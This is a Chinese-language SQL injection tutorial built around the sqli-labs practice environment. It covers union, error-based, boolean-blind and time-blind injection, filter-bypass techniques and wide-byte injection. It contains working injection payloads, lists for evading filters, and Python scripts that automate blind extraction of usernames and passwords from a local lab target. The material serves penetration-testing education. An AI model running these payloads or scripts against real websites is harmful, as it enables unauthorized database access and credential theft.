# SQL注入概念和前期知识

## **SQL 注入漏洞简介：**

最常见的漏洞之一，在 OWASP TOP Ten 中长期位居前三。SQL注入是发生于应用程序的数据库层的安全漏洞。具体表现在输入的字符串之中注入SQL指令，在设计不良的程序(Web系统,客户端)当中忽略了检查，那么这些注入进去的指令就会被数据库服务器认为是正常的SQL指令而运行，因此遭到数据库被篡改或服务器被攻击。

![image-20230303093730193](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030937290.png)

## **Web 服务中的 SQL 数据库查询**

PHP、ASP、JSP 等脚本语言使 Web 应用可以动态处理 HTTP 请求，并提供数据库访问接口，以满足数据交互的需求。

![image-20230303094758125](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030947182.png)

**通过以下例子逐步追踪涉及数据库交互的HTTP 请求响应工作原理**

在浏览器上点击链接，浏览器向Web服务器发送HTTP请求，用Burp抓包看到HTTP请求细节，此处是访问 /backend/content_detail.php 并用Get方法传递了参数id=1。

![image-20230303094812997](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030948041.png)

![image-20230303094827504](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030948550.png)

在浏览器上看到Web服务器响应的结果，在Burp中可以看到响应包的细节。

![image-20230303094842513](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030948557.png)

![image-20230303094852590](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030948633.png)

![image-20230303094923982](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030949024.png)

在Web服务器查看 /backend/content_detail.php ，浏览器用Get方法传递的参数 id=1 在PHP代码中被赋值给变量 $id，然后拼接出 SQL 语句 select title, content from contents where id=1; 后发往MySQL 数据库进行查询。

![image-20230303094937657](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030949715.png)

查看 db.php 和 config.php 两个PHP文件，看到关于数据库连接的配置信息。PHP 以用户名密码root/root 登录本地数据库，并访问其中的 news 库。

![image-20230303094950565](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030949609.png)

![image-20230303094957532](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030949586.png)

连接mysql数据库，执行前面所说的 SQL 语句，查询结果与浏览器显示一致。

![image-20230303095004098](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030950158.png)

经过以上对浏览器操作的逻辑追踪，我们再来理解这张图。现在请思考：对于普通用户、攻击者/渗透测试人员，哪些部分是可控的？

![image-20230303095029475](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030950542.png)

可以修改 HTTP GET 参数id的值控制数据库执行的 SQL 语句。



在 HTTP GET 参数 id 中注入 SQL 语句，适当构造后可以拖取数据库内容。

![image-20230303095039504](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030950556.png)

![image-20230302221305379](https://raw.githubusercontent.com/countdracular/pic-md/main/202303022213418.png)

## **练习环境搭建**

在Kali 虚拟机里创建靶机容器。

```
docker run -itd -p80:80 acgpiano/sqli-labs
docker ps
```

启动靶机 docker 容器：

```
docker start b1d6b0fc9e9c
```

进入容器命令行：

```
docker exec -it b1d6 /bin/bash
```

![image-20230303095048065](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030950123.png)

进入 MySQL： mysql

![image-20230303095055285](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030950330.png)

访问网页界面，初始化数据库。

![image-20230303095103471](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951520.png)

# SQL注入基本方法

## 联合查询注入

### 原理简述

1. 后台语句形如 select * from 表1 where 字段1 =  [可控字符串]
2. 构造可控字符串为 -1 union select a,b,c,...，最终SQL语句为 select * from 表1 where 字段1 = -1 union select a,b,c,...
3. 当 union select 字段数与前面语句字段数相同，且前面的查询结果为空时，a,b,c,...的结果成为查询最终结果。

### 操作步骤

**根据报错信息推断后台 SQL 语句**
MySQL 语法错误的报错信息会显示部分 SQL 语句，Less-1 例题输入 id=1’的错误提示表面 SQL 语句中存在 '1'' LIMIT 0,1 ，由此推测完整语句如下：
select * from 表1 where 字段1=’$_GET[id]’；

# ![image-20230303095112705](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951771.png)

后台 SQL 语句用单引号保护了输入变量，输入字符串都不会被解析为 SQL 语句。

为了打破这层保护，输入单引号向前闭合，输入注释符使后面的单引号失效，即可在中间注入 SQL 语句。

```sql
select * from 表1 where 字段1='      -1'此处可注入SQL语句%23           '
```

**根据 order by 报错判断查询字段数**

order by 跟数字表示按返回结果的第几个字段排序，数字超出返回字段数时报错。

![image-20230303095119831](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951883.png)

**union select 联合查询，将所需信息打印到页面**

![image-20230303095128919](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951963.png)

**information_schema 中常用的两张表：tables、columns**

![image-20230303095136350](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951408.png)

![image-20230303095143517](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951570.png)

**注入得到表名和字段名**

http://192.168.33.138/Less-1/?id=111'union select 1,2,group_concat(table_name,0x2b,column_name)from information_schema.columns where table_schema=database()%23

![image-20230303095149109](C:\Users\Lzk\Desktop\202303030951159.png)

**查询任意表的内容**

http://192.168.33.138/Less-1/?id=111'union select 1,2,group_concat(username,0x2b,password)from users23

![image-20230303095156893](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303030951957.png)

## 报错注入

### 原理简述

当页面不显示查询结果，但显示报错信息时，可构造特定报错语句，并在其中注入查询语句，将查询结果输出到报错信息中。

1. 通过向前/向后闭合、注释符等方法找到注入点。
2. 注入特定报错语句，查看报错信息是否包含查询结果。
3. 在语句中构造各种查询，获取数据库信息。

### 操作步骤

闭合单引号，找到注入点。

![image-20230303150241670](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031502724.png)

测试报错语句是否能输入查询结果

![](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031457308.png)

查询表名

![image-20230303150619116](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031506177.png)

查询字段名

![image-20230303150953257](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031509320.png)

查询内容

![image-20230303151032412](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031510479.png)

报错信息可能有长度限制，需要活用limit、left、right、mid等语句逐个/段输出。

![image-20230303151205345](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031512413.png)

![image-20230303151357400](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031513461.png)

### 报错语句总结

一般情况用updatexml()和extractvalue()，默认不带空格、*号、and等常被过滤的字符。

```sql
(updatexml(1,concat(111,(user()),111),1)) #没有空格、*、and
(extractvalue(1,concat(111,(user()),111))) #没有空格、*、and
(extractvalue(rand(),concat(111,version())),1) #没有空格和*，但rand里面有and
geometrycollection((select * from(select * from(select user())a)b))
multipoint((select * from(select * from(select user())a)b))
polygon((select * from(select * from(select user())a)b))
multipolygon((select * from(select * from(select user())a)b))
linestring((select * from(select * from(select user())a)b))
multilinestring((select * from(select * from(select user())a)b))
exp(~(select * from(select user())a))
(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) 
```

如果确实禁用空格可用括号绕过。

```
select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())
(updatexml(1,concat(111,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),111),1))
```

## 布尔盲注

### 原理简述

页面不显示查询结果和报错信息，但查询结果是否为空对应页面显示不同的情况，通过构造SQL语句验证特定布尔值的真假，通过验证大量布尔值可恢复出完整数据。

有点像警察在询问只有眼皮会动的目击者，眨一次眼表示“是”，眨两次眼表示“否”。由于需要大量交互，一般使用自动化工具或编写自动化脚本完成盲注。

### 操作步骤

尝试各种输入，发现不同输出页面

![image-20230303154648860](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031546908.png)![image-20230303155515090](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031555149.png)

构造注入点

![image-20230303155739035](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031557084.png)![image-20230303155758665](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031557713.png)

将1=1、1=2替换为特定布尔表达式，根据页面输出即可判断布尔值真假。

例如，判断当前数据库名的字符长度为8

![image-20230303160141504](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031601556.png)![image-20230303160206334](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031602376.png)

写python脚本布尔盲注database()

```python
import requests

result = ''
for i in range(100):
    for j in range(31,127):
        payload = 'ascii(mid(database(),{},1))={}'.format(str(i),str(j))
        url = "http://192.168.33.138/Less-8/?id=-1'=({})='".format(payload)
        res = requests.get(url)
        if 'You are in' in res.text:
            result += chr(j)
            print(result)
            break
```

![image-20230303161149636](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031611689.png)

获取表名

```
import requests

result = ''
for i in range(100):
    for j in range(31,127):
        payload = 'ascii(mid((select group_concat(table_name)from information_schema.tables where table_schema=database()),{},1))={}'.format(str(i),str(j))
        url = "http://192.168.33.138/Less-8/?id=-1'=({})='".format(payload)
        res = requests.get(url)
        if 'You are in' in res.text:
            result += chr(j)
            print(result)
            break
```

![image-20230303161351595](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031613696.png)

获取字段名

```python
import requests

result = ''
for i in range(100):
    for j in range(31,127):
        payload = 'ascii(mid((select group_concat(column_name)from information_schema.columns where table_schema=database()and table_name="users"),{},1))={}'.format(str(i),str(j))
        url = "http://192.168.33.138/Less-8/?id=-1'=({})='".format(payload)
        res = requests.get(url)
        if 'You are in' in res.text:
            result += chr(j)
            print(result)
            break
```

![image-20230303161553758](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031615845.png)

查询表的内容

```
import requests
             
result = ''  
for i in range(200):
    for j in range(31,127):
        payload = 'ascii(mid((select group_concat(username,0x2b,password)from users),{},1))={}'.format(str(i),str(j))
        url = "http://192.168.33.138/Less-8/?id=-1'=({})='".format(payload)
        res = requests.get(url)
        if 'You are in' in res.text:
            result += chr(j)
            print(result)
            break
```

![image-20230303161902744](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031619932.png)

## 延时盲注

### 原理简述

页面不显示任何查询结果、报错信息，且查询结果无法影响页面显示时，考虑是否存在延时盲注，即通过构造包含sleep()函数的SQL语句并观察页面返回是否延时，判断布尔值真假。

### 操作步骤

找到注入点，并测试sleep()函数能否实现延时效果。

![image-20230303163115256](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031631323.png)

构造SQL语句，使特定布尔值决定是否延时。

![image-20230303163336130](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031633195.png)

通过是否延时，判断当前数据库字符长度为8。

![image-20230303163428529](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031634593.png)

![image-20230303163448511](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031634572.png)

写python脚本进行延时盲注。（查询表名、字段名等步骤与布尔盲注类似，不再赘述。直接取其中一个为例）

```
import requests
import time

dur = 0.2 
result = ''
for i in range(200):
    for j in range(31,127):
        t = time.time()
        payload = 'ascii(mid((select group_concat(username,0x2b,password)from users),{},1))={}'.format(str(i),str(j))
        url = "http://192.168.33.138/Less-9/?id=1'and(if(({}),sleep({}),1))%23".format(str(dur),payload)
        res = requests.get(url)
        if(time.time()-t > dur - 0.05):
            result += chr(j)
            print(result)
            break
```

![image-20230303164625254](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303031646317.png)

布尔盲注的效率依赖网络质量，通过互联网进行延时盲注是需要把时延调大，否则会影响结果准确性。

由于耗时较长，此处可以考虑算法，例如使用二分法。

```
import requests
import time
from urllib.parse import quote

def search_char(i,l,r):
    m = (r+l)//2
    dur = 0.1
    if(m == l):
        return chr(m+1)
    elif(l<r):
        t = time.time()
        payload = 'ascii(mid((select group_concat(username,0x2b,password)from users),{},1))>{}'.format(str(i),str(m))
        url = "http://192.168.33.138/Less-9/?id=1'and(if(({}),sleep({}),1))%23".format(quote(payload),str(dur))
        res = requests.get(url)
        if(time.time()-t > dur - 0.05):
            return search_char(i,m,r)
        else:
            return search_char(i,l,m)
    else:
        return -1

result = ''
l = 30
r = 127 # ASCII 匹配范围30到127对应可打印字符
for i in range(1,200):
    result += search_char(i,l,r)
    print(result)
```

将查询结果转换为二进制，逐位判断，时间复杂度与二分法接近。（因无法排出不可打印字符，比二分法时间复杂度稍大，但差别可忽略不计）

【编写脚本时注意SQL语句中的&要url编码，否则会被HTTP协议误解析为连接多个GET参数的符号】

```
import requests
import time
from urllib.parse import quote

dur = 0.1 
result = ''
for i in range(1,200):
    b = ''
    for j in range(8):
        t = time.time()
        payload = 'conv(hex(mid((select group_concat(username,0x2b,password)from users),{},1)),16,10)>>{}&1'.format(str(i),str(j))
        url = "http://192.168.33.138/Less-9/?id=1'and(if(({}),sleep({}),1))%23".format(quote(payload),str(dur))
        res = requests.get(url)
        if(time.time()-t > dur - 0.05):
            b = '1' + b 
        else:
            b = '0' + b 
    result += chr(int(b,2))
    print(result)
```

条件允许的情况下，逐位判断比常规二分法书写更简便，代码可读性更高。

# 绕过过滤

—— 今天我们玩《不说英语挑战》，谁先说英语算谁输！现在开始咯？

—— OK~

防守方通过对输入字符串的过滤避免 SQL 注入漏洞，相应的，攻击方要以不同形式的 SQL 语句绕过过滤，且达到同样的攻击目的。

这就需要攻击者熟练掌握 SQL 语法，包括很多不常用的语法。

## 注释符

```sql
%23
--+
-- xxx
--%20
--%a0
--%09
--%0b
--%0c
--%0d
--%0e
--%0f
;%00
```

注意：此处的空格均为%20，非%2b。注意某些浏览器插件可能误将-- 编码为--%2b

以上注释符都被过滤的情况，考虑向后闭合，例如：

```
select * from 表1 where id='   1'=(注入点)='  ' limit 0,1;
```

## 代替空格

```
/**/
/*!*/
%20
%09
%a0
%00
%0a
%0b
%0c
%0d
%0e
%0f
```

整数后面必须有空格，但浮点数或科学计数法可以不跟空格：

```
select * from users where id=8E0union select 1,2,3;
select * from users where id=8.0union select 1,2,3;
```

用括号构造无空格的 SQL 语句（注意：内部的select语句要放在括号内）：

```
select * from users where id='111'=(if(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),5,1))>1,sleep(1),1));
```

## 代替引号

字符串用十六进制编码代替：

```
?id=111'union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'%23
?id=111'union select 1,2,group_concat(column_name)from information_schema.columns where table_name=0x7573657273%23
```

## 关键字过滤绕过

通过内联、外联、大小写变换、双写绕过：

```
u/**/nion sel/**/ect
/*!union*/ select
UniOn SelEct
Uniunionon selselectect
```

## 代替布尔值

True

```
1=1
'a'='a'
'a'like'a'
'a'in('a')
2 between 1 and 3
'b'between'a'and'c'
'a'<'b'
```

False

```
1=2
'a'='b'
1 like 2
'a'like'b'
'a'in('b')
1 between 2 and 3
'a'between'b'and'c'
'a'>'b'
```

## 逗号绕过

```
select mid('abc',2,1);
select mid('abc'from 2 for 1);
select mid('abc'from(2)for(1));
select database()like'%sec%';
select database()like'_e_u_i_y';
```

```
select 1,2,3;
select*from(select 1)a join(select 2)b join(select 3)c;
select*from((select(1))a)join((select(2))b)join((select(3)))c;
?id=111'union(select*from((select(1))a)join((select(2))b)join((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))c);%23
```

以上给出了没有逗号且没有空格的例子。

```
select * from users limit 0,1;
select * from users limit 1 offset 0;
```

## 比较运算符绕过

```
select 1>2;
select greatest(1,2)=1;
select least(1,2)=2;
```

```
select 1=1;
select 1 like 1;
select 1 regexp 1;
select'abc'regexp'b';
```

## 数字绕过

```
false	!pi()#0
true	!(!pi())#1
true+true	#2
floor(pi())	~~pi()#3
ceil(pi())	#4
floor(version())	#5#版本号是5.x的情况
floor(pi())+floor(pi())	#6
floor(pi())+ceil(pi())	#7
ceil(pi())+ceil(pi())	#8
floor(pi())*floor(pi())	#9
floor(pi())*floor(pi())+true	#10
```

## 宽字节注入

Less-32

题目源码 index.php 对输入中的特殊字符进行了转义，输入'变为\\', 无法正常闭合。但源码中声明了编码为 GBK，考虑宽字节注入。

```
mysql_query("SET NAMES gbk");
```

![image-20230305151653670](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303051516875.png)

![image-20230305151731502](https://raw.githubusercontent.com/F4k34rch3r/pic-md/main/202303051517675.png)

PHP 对输入中的特殊字符转义，变为 %df\\' 

但由于编码为 GBK，%df\\ 即 %df5c 被解码为一个宽字节，相当于转义符被%df吃掉了，单引号不受影响，可以正常闭合。

